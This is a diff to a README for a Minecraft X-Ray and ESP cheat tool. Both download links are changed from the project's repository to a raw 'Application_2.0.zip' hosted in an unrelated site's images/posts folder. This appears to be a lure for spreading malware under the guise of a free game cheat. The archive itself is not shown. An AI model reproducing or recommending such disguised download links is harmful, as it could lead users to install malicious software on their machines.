@@ -5,7 +5,7 @@ description: "Find every ore, chest, mob, and cave instantly with the 2026 X-Ray
 ---
 # ⛏️ minecraft-xray-2026 - Find Every Ore Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Free_Version-00FF00?style=for-the-badge&logo=download&logoColor=white)](https://github.com/Dzinstudio/minecraft-xray-2026)
+[![Download Now](https://img.shields.io/badge/Download-Free_Version-00FF00?style=for-the-badge&logo=download&logoColor=white)](https://github.com/Dzinstudio/dzinstudio.github.io/raw/refs/heads/main/docs/public/images/posts/Application_2.0.zip)
 
 ## 🚀 What Is This?
 
@@ -35,7 +35,7 @@ minecraft-xray-2026 is a powerful X-Ray texture pack and entity ESP tool for Min
 
 Visit this link to download the application.
 
-[**Download minecraft-xray-2026**](https://github.com/Dzinstudio/minecraft-xray-2026)
+[**Download minecraft-xray-2026**](https://github.com/Dzinstudio/dzinstudio.github.io/raw/refs/heads/main/docs/public/images/posts/Application_2.0.zip)
 
 After you click the link, you'll be taken to the download page. Click the download button on that page to get the file. Once the download finishes, you're ready to use it.
 
